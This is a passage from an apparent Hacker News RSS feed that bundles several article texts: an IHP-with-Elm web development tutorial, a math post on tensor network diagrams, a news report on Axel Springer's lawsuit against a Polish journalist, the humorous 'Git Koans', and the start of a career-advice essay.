Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515037">thread link</a>) | @_query
<br/>
December 22, 2020 | https://driftercode.com/blog/passing-flags-from-ihp-to-elm | <a href="https://web.archive.org/web/*/https://driftercode.com/blog/passing-flags-from-ihp-to-elm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Generate types, encoders and decoders for Elm automatically in IHP.</p><article><p><em>This is <strong>part 2</strong> of the series <a target="_blank" rel="noreferrer noopener" href="https://driftercode.com/blog/ihp-with-elm-series">IHP with Elm</a></em></p><p>When initializing Elm, you can set initial values through something called <a target="_blank" rel="noreferrer noopener" href="https://guide.elm-lang.org/interop/flags.html">flags</a>.</p><p>For this part of the series, I want to show you a technique for loading these values called flags directly from IHP into Elm in a type-safe way.</p><p>And what's even cooler, we will also enable you to <strong>generate Haskell types to Elm</strong> without writing any decoders or encoders manually ğŸ˜</p><h2>Starting out simple</h2><p>IHP is a full-stack web framework, and Elm should as mentioned in the previous post not be used for absolutely everything view-related in an IHP app.</p><p><strong>In IHP, use Elm only when you start to think "I actually need Elm".</strong> That will keep the complexity down and let you use Elm for what it's great for.</p><p>All this being said, the examples in this tutorial are made extremely simple to make the process easier to follow.</p><h2>Continue from part one</h2><p>If you haven't done <a href="https://driftercode.com/blog/ihp-with-elm">part 1</a> of this series, do so first.</p><p><strong>If you don't want to</strong>, you could <a target="_blank" rel="noreferrer noopener" href="https://github.com/kodeFant/ihp-with-elm">clone the project source</a> and checkout to this tag to follow along:</p><code-editor language="bash"></code-editor><h2>Create an IHP database type</h2><p>To demonstrate how we can insert different datatypes into Elm, let's create a relatively complex database table.</p><p>Run the app with <code>npm start</code> and go to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8001/Tables">localhost:8001/Tables</a>.</p><p>Select the <code>Code Edit</code> toggle in the top left corner and paste this snippet into the code area:</p><code-editor language="bash"></code-editor><p>Remember to press <code>Save</code> down in the bottom. It's a bit hidden, so easy to miss.</p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/makeschemacode.gif" alt="Pasting in schema" loading="lazy"></p><p>After saving, press <code>Update DB</code> in the IHP dashboard. This should update the database with the new table.</p><p>This will have automatically created the type <code>Book</code>. Let's create a controller for it next.</p><h2>Generate Controller and Views</h2><p>Stay in the <code>localhost:8001</code> admin dashboard and select <code>Codegen</code> in the menu to the left.</p><p>Select <code>Controller</code>, name it <code>Books</code> and click <code>Preview</code> and click <code>Generate</code>.</p><p><strong>Like this:</strong></p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/make-controller.gif" alt="Create Controller named Books" loading="lazy"></p><p>You will now have generated all you need to view, update, create and delete books. Pretty cool!</p><p>Just a couple of small adjustments before we proceeed:</p><p>Let's just use a checkbox field for the <code>hasRead</code> value and a datepicker for the <code>publishedAt</code> value.</p><p>In <strong>both</strong> <code>New.hs</code> and <code>Edit.hs</code> in the <code>/Web/View/Books/</code> folder, replace these two fields:</p><code-editor language="haskell"></code-editor><p>to</p><code-editor language="haskell"></code-editor><p>Let's also take a short visit to the Books Controller <code>/Web/Controller/Books.hs</code> and the buildBook function at the bottom. Make sure the nullable value <code>review</code> turns into <code>Nothing</code> if empty instead of <code>Just ""</code>.</p><code-editor language="haskell"></code-editor><p>Then go to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8000/Books">http://localhost:8000/Books</a> to create just a couple of Books with some varying values.</p><h2>Some small changes in the hsx templates</h2><p>We are adding the Elm widget application globally because we are going to use it as a general purpose widget engine.</p><p>Navigate to <code>Web/View/Layout.hs</code> and add the elm script <code>&lt;script src="/elm/index.js"&gt;&lt;/script&gt;</code> to the scripts in development and remove the unused scripts for development as well.</p><code-editor language="hs"></code-editor><p>Note that we are using <strong>defer</strong> on prod.js and the elm script for Elm to load properly.</p><p>Secondly, let's replace what we wrote in the previous part of the series in <code>/Web/View/Static/Welcome.hs</code>, just to have a practical link to the Books.</p><code-editor language="hs"></code-editor><h2>Install haskell-to-elm</h2><p><code>haskell-to-elm</code> will let us generate Elm types from Haskell types, including encoders and decoders.</p><p>In order to generate Elm types from IHP, add the <code>haskell-to-elm</code> package to <strong>haskellDeps</strong> in <code>default.nix</code></p><code-editor language="nix"></code-editor><p>To update your local environment, close the server <strong>(ctrl+c)</strong> and run</p><code-editor language="bash"></code-editor><p>If you are on vscode, you might need to reload your text editor to catch the updates in .envrc.</p><p>Also add the required Elm packages required by <code>haskell-to-elm</code>. I i highly recommend the cli-tool <a target="_blank" rel="noreferrer noopener" href="https://github.com/zwilias/elm-json">elm-json</a> to install elm packages.</p><code-editor language="bash"></code-editor><h2>Reduce boilerplate for Haskell-to-Elm types</h2><p>Following these instructions will make it easier to add <code>haskell-to-elm</code> types later on.</p><p>Create a folder named <code>Application/Lib</code> and create a new Haskell module:</p><code-editor language="bash"></code-editor><p>Paste this code into <code>Application/Lib/DerivingViaElm.hs</code>.</p><code-editor language="haskell"></code-editor><p>You probably won't ever do any changes in this script, but it saves us from lots of boilerplate when creating <em>Haskell to Elm types</em>.</p><h2>Turn IHP types into JSON serializable types</h2><p>Create the file where the elm-compatible types will live.</p><code-editor language="bash"></code-editor><p>In <code>Web/JsonTypes.hs</code> we will create types that can be directly serialized into both JSON and Elm decoders. For starters, we will make a <code>BookJSON</code> type and a function for creating it from the IHP generated <code>Book</code>.</p><code-editor language="haskell"></code-editor><p>This is some extra work, but you also get to control what fields that will be exposed to the outside world here.</p><h2>Make a widget entry-point</h2><p>A logical place to write the entrypoints for this Elm widget is <code>Application/Helper/View.hs</code> as functions exposed here are accessible in all view modules.</p><p>We will also define a <code>Widget</code> type that will be like a register for all new widgets.</p><code-editor language="haskell"></code-editor><p><code>bookWidget</code> takes in the IHP <code>Book</code> type as an argument, converts to the <code>BookJSON</code> type and wraps it inside a <code>Widget</code>.</p><p>Now we need to jump to the <code>elm/index.js</code> file and pass in the <code>data-flags</code> attribute from the widget. While we are at it we are also enabling the possibility to have several elm widgets present at one single page.</p><code-editor language="tsx"></code-editor><p>The value passed into the <code>data-flags</code> attribute is serialized and ready to be sent right through JavaScript and directly into Elm.</p><p>Let's put this <code>bookWidget</code> into <code>/Web/View/Books/Show.hs</code>:</p><code-editor language="haskell"></code-editor><h2>Autogenerate types</h2><p>Now it's time for the fun stuff. We need to go back to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8001/">localhost:8001</a> and generate a script and select <code>Codegen</code> in the left menu and then <code>Script</code>. Type <code>GenerateElmTypes</code>, select <code>Preview</code> and then <code>Generate</code>.</p><p><strong>Like this:</strong></p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/generate-elm-script.gif" alt="Generate Elm Script" loading="lazy"></p><p>IHP will have created an boilerplate for an executable for you.</p><p>Fill in the export logic for generating Elm types in <code>/Application/Script/GenerateElmTypes.hs</code>:</p><code-editor language="haskell"></code-editor><p>Let's test it. Run:</p><code-editor language="bash"></code-editor><p>Voila! If everything has gone well so far, you should have a file named <code>elm/Api/Generated.elm</code>. Inspect it with great joy. You didn't need to write any of this manually in Elm.</p><p><strong>What a beauty!</strong></p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/generated-code.gif" alt="Generated Elm types" loading="lazy"></p><p>Let's make a <code>npm run gen-types</code> script for it in <code>package.json</code> and we might as well run it at the <code>npm start</code> command to update it regularly.</p><code-editor language="json"></code-editor><h2>Write some Elm</h2><p>Let's finish up this tutorial by rewriting the <code>Main.elm</code> to decode the flags and use the Haskell model.</p><code-editor language="elm"></code-editor><p>Go to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8000/Books">localhost:8000/Books</a> and press <code>Show</code> on any book you have created. You should see where Elm starts and begins with the <code>&lt;elmğŸŒ³&gt;</code> tag.</p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/showbook.png" alt="A sample of the Elm component" loading="lazy"></p><p>The Elm logic is handling every type as it was defined in Haskell, from <code>Bool</code> to even <code>Maybe String</code>.</p><p>To get a complete overview of the changes, see the <a target="_blank" rel="noreferrer noopener" href="https://github.com/kodeFant/ihp-with-elm/compare/2-ihp-with-elm...3-pass-data-from-ihp-to-elm">diff compared what we did in the previous post</a></p><h2>Next up</h2><p>We have created only one widget, but in the next post we are adding another one.</p><p>We are also structuring the widgets into separate modules, inpired by <a target="_blank" rel="noreferrer noopener" href="https://github.com/rtfeldman/elm-spa-example">Richard Feldman's RealWorld SPA archtecture</a>, but a simpler version.</p><ul><li><a href="https://driftercode.com/blog/structure-elm-into-a-multi-widget-app-for-ihp">Read on to <strong>part 3</strong> to structure your widgets in a nice way</a></li></ul></article></div>]]>
            </description>
            <link>https://driftercode.com/blog/passing-flags-from-ihp-to-elm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515037</guid>
            <pubDate>Wed, 23 Dec 2020 06:31:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Matrices as Tensor Network Diagrams]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514883">thread link</a>) | @behnamoh
<br/>
December 22, 2020 | https://www.math3ma.com/blog/matrices-as-tensor-network-diagrams | <a href="https://web.archive.org/web/*/https://www.math3ma.com/blog/matrices-as-tensor-network-diagrams">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href=""><p>In the <a href="https://www.math3ma.com/blog/matrices-probability-graphs">previous post</a>, I described a simple way to think about matrices, namely as bipartite graphs. Today I'd like to share a different way to picture matricesâ€”one which is used not only in mathematics, but also in physics, chemistry, and machine learning. Here's the basic idea. An $m\times n$ matrix $M$ with real entries represents a linear map from $\mathbb{R}^n\to\mathbb{R}^m$. Such a mapping can be pictured as a node with two edges. One edge represents the input space, the other edge represents the output space.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c18ee025347a27a32481_node.jpg" alt=""></p></figure><p>That's it!</p><p>We can accomplish much with this simple idea. But first, a few words about the picture: To specify an $m\times n$ matrix $M$, one must specify all $mn$ entries $M_{ij}$. The index $i$ ranges from 1 to $m$â€”the dimension of the output spaceâ€”and the index $j$ ranges from 1 to $n$â€”the dimension of the input space. Said differently, $i$ indexes the number of rows of $M$ and $j$&nbsp;indexes the number of its columns. These indices can be included in the picture, if we like:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cdaa5a8312b3a44ecb44278_Mij.jpg" alt=""></p></figure><p>This idea generalizes very easily. A matrix is a two-dimensional array of numbers, while an $n$-dimensional array of numbers is called a <strong>tensor of order $n$</strong> or an $n$-<strong>tensor</strong>. Like a matrix, an $n$-tensor can be &nbsp;represented by a node with one edge for each dimension.</p><p>A number, for example, can be thought of as a zero-dimensional array, i.e. a point. It is thus a 0-tensor, which can be drawn as a node with <em>zero</em> edges. Likewise, a vector can be thought of as a <em>one</em>-dimensional array of numbers and hence a 1-tensor. It's represented by a node with <em>one </em>edge. A matrix is a <em>two</em>-dimensional array and hence 2-tensor. It's represented by a node with <em>two</em> edges. A 3-tensor is a <em>three</em>-dimensional array and hence a node with <em>three</em> edges, and so on.</p><figure id="w-node-27a904484310-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd99a73f8ce4494ad86852e_arraychart.jpg" alt=""></p></figure><p>In this graphical notation, familiar things have nice pictures. For example...</p><h3><strong>Matrix multiplication is tensor contraction.</strong></h3><p>Multiplying two matrices corresponds to "glueing" their pictures together. This is called tensor <strong>contraction</strong>.</p><figure id="w-node-0b127d2e466c-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c1cae025346888a363e5_mult.jpg" alt=""></p></figure><p>In the picture above, the edges with matching indices $j$ were the ones that were contracted. This is consistent with the fact that two matrices can be multiplied only when their input/output dimensions match up. You'll also notice that the resulting picture has two free indices, $i$ and $k$, which indeed defines a matrix.</p><p><strong>â€</strong>By the way, a key feature of having these pictures is that we don't have to carry around indices. So let's not!</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c1e80208a6476b30f327_mult2.jpg" alt=""></p></figure><p>A quick check: A&nbsp;matrix was described as a <em>single </em>node with one edge for each vector space, yet the picture above has <em>two</em> nodes. We still want this to represent a <em>single</em> matrix.&nbsp;And I claim it does!&nbsp;There's a nice way to see this: simply smoosh the blue and green nodes together.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c27e03764fbf94b64409_mult3.jpg" alt=""></p></figure><p>This reminds me of rain trickling down a window: when two raindrops come into contact, they fuse into bigger droplet. That's matrix-matrix multiplication. A similar picture holds for matrix-vector multiplication:&nbsp;a matrix $M$&nbsp;multiplied by a vector $\mathbf{v}$ results in another vector $M\mathbf{v}$, which is a node with one free edge.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd99bab91c3d7662087429d_Mv.jpg" alt=""></p></figure><p>More generally, the product of two or more tensors is represented by a cluster of nodes and edges where the contractions occur along edges with matching indices.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd99bffc370fa3fc0756ede_TN.jpg" alt=""></p></figure><h3>â€<strong>Node shapes can represent different properties.</strong></h3><p>So far I've drawn all the nodes as circles. But this was just a choice. There is no official rule for which shape to use. That means we can be creative! For example, we might want to reserve a circle or other symmetric shape, like a square, for <em>symmetric</em> matrices only.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8be6091c3d7f6e5487d7e_notsym.jpg" alt=""></p></figure><p>Then the <em>transpose </em>of a matrix can be represented by reflecting its picture:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8be69c3d075631a5fe753_tranpose.jpg" alt=""></p></figure><p>So the symmetry of a symmetric matrix is preserved in the diagram!</p><figure id="w-node-bef31dc22539-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8be5503764fd9b8b592a6_symmetric.jpg" alt=""></p></figure><p>I&nbsp;also like the idea of drawing isometric embeddings as triangles:</p><figure id="w-node-aa68c59a594a-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c13ae02534421aa30e9b_isometry1.jpg" alt=""></p></figure><p>An isometric embedding $U$&nbsp;is a linear map from a space $V$&nbsp;into a space $W$ of larger dimension that preserves the lengths of vectors.<strong> </strong>Such a map satisfies $U^\top U=\text{id}_V$ but $UU^\top \neq \text{id}_W$. In words, you can always embed the small space $V$ into a larger one, then project back onto $V$ without distorting the vectors in $V$. (Not unlike a <a href="https://en.wikipedia.org/wiki/Retract">retraction map</a> in topology.) But you certainly <em>can't</em> squish all of $W$ onto little $V$, then expect to undo the damage after including $V$ back into $W$. This large-versus-small feature is hinted at by the triangles. (The base of a triangle is larger than its tip!) And in general, as shown below, identity linear operators are drawn as straight lines:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c1325dcff22ae46c5494_isometry.jpg" alt=""></p></figure><p>â€</p><h3><strong>Matrix factorizations have nice pictures, too.</strong></h3><p>With all this talk of matrix multiplication, i.e. matrix composition, let's not forget about matrix factorization, i.e. matrix <em>de</em>composition! Every matrix, for example, has a <a href="https://jeremykun.com/2016/04/18/singular-value-decomposition-part-1-perspectives-on-linear-algebra/">singular value decomposition</a>. This has a nice picture associated to it:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cdc15cb6a203e5ca33a3fb1_SVD.jpg" alt=""></p></figure><p>Here, $U$&nbsp;and $V$&nbsp;are unitary matrices, and hence isometries, and hence triangles. The matrix $D$&nbsp;is a diagonal matrix, which I like to represent by a diamond. In short, matrix factorization is the decomposition of a single node into multiple nodes; matrix multiplication is the fusion of multiple nodes into a single node.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cdc300c04fb87fb1aeb9854_duo.jpg" alt=""></p></figure><p>The drawing above illustrates another feature of these diagrams:&nbsp;the spatial position of the nodes doesn't really matter. I could've drawn the yellow, blue, green, and pink nodes in horizontal line, or in a vertical line, or in a zig-zag, or however I wish. The only important thing is that the diagram has two free edges. The product of matrices is another matrix!</p><h3><strong>Messy proofs reduce to picture proofs.</strong></h3><p>There's more we could say about this graphical notation, but I'll wrap up with another noteworthy feature: proofs can become very simple! Take the trace, for example. The trace of a matrix has a simple picture. It's defined to be the sum along a common index:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c42291c3d71260494990_trace.jpg" alt=""></p></figure><p>This string-with-a-bead has no free edges. It's a loop. This is consistent with the fact that the trace is a <em>number. </em>It's a 0-tensor so it has no free indices. Now here's a proof that the trace is invariant under cyclic permutations:</p><figure id="w-node-f919cf76bde4-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c56ef8ce44ea434b641b_proof.jpg" alt=""></p></figure><p>Just slide beads along a necklace. So clean!</p><h3><strong>What's in a name?</strong>â€</h3><p>The diagrams discussed in today's post, which have their origins in <a href="https://en.wikipedia.org/wiki/Penrose_graphical_notation">Penrose's graphical notation</a>, are called <strong>tensor network diagrams </strong>and/or, perhaps with some minor differences, <strong>string diagrams</strong>. The "and/or" depends on who you are<em>.</em> That is, the idea to visually represent a map-of-vector-spaces as a node-with-edges is used in the physics/machine learning communities, where they are called <em>tensor network diagrams, </em>and also in the category theory community, where they are called <em>string diagrams</em>. I think this is just a case of different fields using nearly identical notation for different purposes.</p><p>Category theorists use string diagrams to <em>prove</em> things. (The diagrams appear in my little booklet on <a href="https://arxiv.org/abs/1809.05923">applied category theory</a>, for instance.) What's more, string diagrams are used to represent most any kind of mappingâ€”not just mappings between vector spaces. Said more formally, string diagrams might arise in a discussion of any <em>monoidal category</em>. For a gentle introduction to these categorical ideas, check out <a href="https://arxiv.org/abs/1803.05316">Seven Sketches</a> by Fong and Spivak as well as <a href="https://www.amazon.com/Picturing-Quantum-Processes-Diagrammatic-Reasoning/dp/110710422X">Picturing Quantum Processes </a>by Coecke and Kissinger.</p><p>Some physicists and machine learning researchers, on the other hand, use tensor networks to <em>compute</em> things. A typical situation may go something like this. You have a quantum system. You wish to find the main eigenvector of a special linear operator, called a <a href="https://en.wikipedia.org/wiki/Hamiltonian_(quantum_mechanics)">Hamiltonian.</a> This eigenvector lives in an absurdly large Hilbert space, so you want a technique to find this vector in a compressed kind of way. Enter: tensor networks. </p><p>And by "absurdly large," I&nbsp;do mean ABSURDLY large. If you have an Avogadro's number's worth of quantum particles, each of which can occupy just two states, then you need a vector space of dimension $2^{10^{23}}$. Now imagine having a linear operator on this space. That's a matrix with $2^{10^{23}}\times 2^{10^{23}}$ entries. That is <em>exponentially</em> more than the number of atoms in the observable universe. There are only $10^{80}$ of those! Good luck storing this on a computer. In summary, tensor networks help us deal with a large number of parameters in a principled, tractable way.</p><p>Tensor networks also have much overlap with <a href="https://arxiv.org/abs/1710.01437">graphical models</a>, automata, and more.&nbsp;One vein of current research is identifying and making good use of those overlaps. So there's a lot to explore here. A few places to start are Miles Stoudenmire's <a href="http://itensor.org/">iTensor library</a>, Roman Orus's <a href="https://arxiv.org/abs/1306.2164">A Practical Introduction to Tensor Networks</a>, Jacob Biamonte's and Ville Bergholm's <a href="https://arxiv.org/abs/1708.00006">Tensor Networks in a Nutshell</a>, and Google's <a href="https://github.com/google/TensorNetwork">TensorNetwork library</a>.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5b527d2844acede360b8e7ae_hline.jpg" alt=""></p></figure><p>Iâ€™ve been working on a project (with some excellent researchers who first introduced me to the tensor network world) that uses these diagrams in a more computational/physics-y setting. For that reason, I tend to think of them as tensor network diagrams, rather than as string diagrams. </p><p>The project, which features a special kind of tensor network, has some really neat mathematics that I'm excited to share. It also uses the <a href="https://www.math3ma.com/blog/matrices-probability-graphs">matrices-as-graphs</a> idea discussed on the blog previously. I plan to blog about it <a href="https://www.math3ma.com/blog/modeling-sequences-with-quantum-states">later in the year.</a> </p><p>Stay tuned!</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5b527d2844acede360b8e7ae_hline.jpg" alt=""></p></figure><p><strong>New! </strong>[Added October 20, 2019] You can see some of today's ideas <em>in action </em>in "<a href="https://arxiv.org/abs/1910.07425">Modeling Sequences with Quantum States</a>" (arXiv:1910.07425). There, we make frequent use of tensor network diagrams, especially in the description of a certain training algorithm. You can read more about this work with Miles Stoudenmire and John Terilla <a href="https://www.math3ma.com/blog/modeling-sequences-with-quantum-states">here on the blog.</a></p></div></div>]]>
            </description>
            <link>https://www.math3ma.com/blog/matrices-as-tensor-network-diagrams</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514883</guid>
            <pubDate>Wed, 23 Dec 2020 06:06:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Axel Springer SE sues Polish journalist who shed light on its Nazi past (2018)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514510">thread link</a>) | @AndrewBissell
<br/>
December 22, 2020 | https://polanddaily.com/108-court-case-starts-against-polish-journalist-who-put-light-on-nazi-background-of-swiss-german-media-empire | <a href="https://web.archive.org/web/*/https://polanddaily.com/108-court-case-starts-against-polish-journalist-who-put-light-on-nazi-background-of-swiss-german-media-empire">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The first hearing in the court case of German-Swiss media empire Ringier Axel Springer against Polish journalist Witold Gadowski was set to take place in the regional court of Warsaw Provincial court of Warsaw but was postponed due to security concerns after up to 100 of Gadowski's supporters showed up in court. </p><div><p>Axel Springer SE is the largest digital publishing house in Europe, controlling two of Germany's largest news brands, Bild and Die Welt. In Poland, it's the publisher of country's largest tabloid "Fakt" and one of the largest weeklies "Newsweek" as well as the largest newsportal Onet.pl.</p>

<p>The media group sued Gadowski for his statement in which he claimed that the company, founded in 1946, was from the outset linked to people from the Wehrmacht, the SS and Gestapo, while the companyâ€™s founder, Axel Springer, was himself involved with the Nazi regimeâ€. In response, the media group Gadowski for infringement of personal interests.</p>

<p>Axel Springer, born in 1912 worked as an editor in his father's newspaper "Altonaer Nachrichter". After Hitler came to power in 1933, the paper participated in the anti-Jewish progaganda campaign directed against the German Jewish community. He was also a member of the Nazi paramilitary organization "The National Socialist Motor Corps". Another stain on his legacy was his decision to abandon his half-Jewish wife Martha Else Meyer, who just had given birth to their first child, soon after the Nurnberg laws came into force and remarrying with an "Aryan" woman.</p>

<p>Witold Gadowski told the media present for the hearing that he hopes that justice will prevail and that the proceeding will be on the grounds of the Polish law, where the constitution guarantees the Polish journalistsâ€™ freedom of speech. He also underlined that Axel Ringer Springer is trying to infringe on that exact freedom of speech by taking him to court.</p>

<p>The judge was surprised by the number of people who appeared in the court to support Gadowski and postponed the hearing due to safety concerns.</p>

<p>According to Gadowski, the case filed against him by Axel Springer could first step on the road to restoring the faith in the media in Poland. The columnist said that he still has faith and believes that facts and the truth will be enough to win the case.</p>
</div></div>]]>
            </description>
            <link>https://polanddaily.com/108-court-case-starts-against-polish-journalist-who-put-light-on-nazi-background-of-swiss-german-media-empire</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514510</guid>
            <pubDate>Wed, 23 Dec 2020 04:53:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git Koans (2013)]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25514238">thread link</a>) | @mmettler
<br/>
December 22, 2020 | https://stevelosh.com/blog/2013/04/git-koans/ | <a href="https://web.archive.org/web/*/https://stevelosh.com/blog/2013/04/git-koans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page-blog-entry"><article><p>Posted on April 8th, 2013.</p><p>Inspired by <a href="http://blog.sanctum.geek.nz/vim-koans/">Vim Koans</a>.</p>

<ol><li><a href="#s1-silence">Silence</a></li><li><a href="#s2-one-thing-well">One Thing Well</a></li><li><a href="#s3-only-the-gods">Only the Gods</a></li><li><a href="#s4-the-hobgoblin">The Hobgoblin</a></li><li><a href="#s5-the-long-and-short-of-it">The Long and Short of It</a></li></ol>

<h2 id="s1-silence"><a href="#s1-silence">Silence</a></h2>

<p>A Python programmer handed her <code>~/.gitconfig</code> to Master Git.  Among the many
lines were the following:</p>

<pre><code>[alias]
; Explicit is better than implicit.  If we want to merge
; we should do so ourselves.
pull = pull --ff-only</code></pre>

<p>Master Git nodded.  "<code>git pull origin master</code>," said the programmer.</p>

<p>Master Git pulled down the latest changes on <code>master</code> and automatically merged
them with the programmer's changes.</p>

<p>"But Master Git, did I not say to only fast-forward in my configuration?!" she
cried.</p>

<p>Master Git looked at her, nodded, and said nothing.</p>

<p>"Then why did you not warn me of a problem with my configuration?" she asked.</p>

<p>Master Git replied: "there was no problem."</p>

<p>Months later the programmer was reading <code>git --help config</code> for a different
reason and found enlightenment.</p>

<h2 id="s2-one-thing-well"><a href="#s2-one-thing-well">One Thing Well</a></h2>

<p>A UNIX programmer was working in the cubicle farms.  As she saw Master Git
traveling down the path, she ran to meet him.</p>

<p>"It is an honor to meet you, Master Git!" she said.  "I have been studying the
UNIX way of designing programs that each do one thing well.  Surely I can learn
much from you."</p>

<p>"Surely," replied Master Git.</p>

<p>"How should I change to a different branch?" asked the programmer.</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I create a branch?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I update the contents of a single file in my working directory,
without involving branches at all?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>After this third answer, the programmer was enlightened.</p>

<h2 id="s3-only-the-gods"><a href="#s3-only-the-gods">Only the Gods</a></h2>

<p>The great historian was trying to unravel the intricacies of an incorrect merge
that had happened many months ago.  He made a pilgrimage to Master Git to ask
for his help.</p>

<p>"Master Git," said the historian, "what is the nature of history?"</p>

<p>"History is immutable.  To rewrite it later is to tamper with the very fabric of
existence."</p>

<p>The historian nodded, then asked: "Is that why rebasing commits that have been
pushed is discouraged?"</p>

<p>"Indeed," said Master Git.</p>

<p>"Splendid!" exclaimed the historian.  "I have a historical record of a merge
commit with two parents.  How can I find out which branch each parent was
originally made on?"</p>

<p>"History is ephemeral," replied Master Git, "the knowledge you seek can be
answered only by the gods."</p>

<p>The historian hung his head as enlightenment crushed down upon him.</p>

<h2 id="s4-the-hobgoblin"><a href="#s4-the-hobgoblin">The Hobgoblin</a></h2>

<p>A novice was learning at the feet of Master Git.  At the end of the lesson he
looked through his notes and said, "Master, I have a few questions.  May I ask
them?"</p>

<p>Master Git nodded.</p>

<p>"How can I view a list of <em>all</em> tags?"</p>

<p>"<code>git tag</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> remotes?"</p>

<p>"<code>git remote -v</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> branches?"</p>

<p>"<code>git branch -a</code>", replied Master Git.</p>

<p>"And how can I view the current branch?"</p>

<p>"<code>git rev-parse --abbrev-ref HEAD</code>", replied Master Git.</p>

<p>"How can I delete a remote?"</p>

<p>"<code>git remote rm</code>", replied Master Git.</p>

<p>"And how can I delete a branch?"</p>

<p>"<code>git branch -d</code>", replied Master Git.</p>

<p>The novice thought for a few moments, then asked: "Surely some of these could be
made more consistent, so as to be easier to remember in the heat of coding?"</p>

<p>Master Git snapped his fingers.  A hobgoblin entered the room and ate the novice
alive.  In the afterlife, the novice was enlightened.</p>

<h2 id="s5-the-long-and-short-of-it"><a href="#s5-the-long-and-short-of-it">The Long and Short of It</a></h2>

<p>Master Git and a novice were walking along a bridge.</p>

<p>The novice, wanting to partake of Master Git's vast knowledge, said:
"<code>git branch --help</code>".</p>

<p>Master Git sat down and lectured her on the seven forms of <code>git branch</code>, and
their many options.</p>

<p>They resumed walking.  A few minutes later they encountered an experienced
developer traveling in the opposite direction.  He bowed to Master Git and said
"<code>git branch -h</code>".  Master Git tersely informed him of the most common <code>git
branch</code> options.  The developer thanked him and continued on his way.</p>

<p>"Master," said the novice, "what is the nature of long and short options for
commands?  I thought they were equivalent, but when that developer used <code>-h</code> you
said something different than when I said <code>--help</code>."</p>

<p>"Perspective is everything," answered the Master.</p>

<p>The novice was puzzled.  She decided to experiment and said "<code>git -h branch</code>".</p>

<p>Master Git turned and threw himself off the railing, falling to his death on the
rocks below.</p>

<p>Upon seeing this, the novice was enlightened.</p>
</article></div></div>]]>
            </description>
            <link>https://stevelosh.com/blog/2013/04/git-koans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514238</guid>
            <pubDate>Wed, 23 Dec 2020 03:59:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A career cold start algorithm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514098">thread link</a>) | @enigmatic02
<br/>
December 22, 2020 | https://boz.com/articles/career-cold-start | <a href="https://web.archive.org/web/*/https://boz.com/articles/career-cold-start">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>Several times in my career, Iâ€™ve joined a team whose work was already well
under way, where I had a massive knowledge deficit, and didnâ€™t have
pre-existing relationships. None of those excuses relieved me from the pressure
I felt to establish myself and contribute. Over time, I realized that the
natural instinct to push for early impact leads many incoming leaders into
challenging relationships as they expose their knowledge deficit and waste
time. So, I developed an algorithm that has helped me ramp up quickly â€” and
in several cases â€” have an impact in a relatively short period of time, while
minimizing collateral damage.</p>
<p>The first step is to find someone on the team and ask for 30 minutes with them.
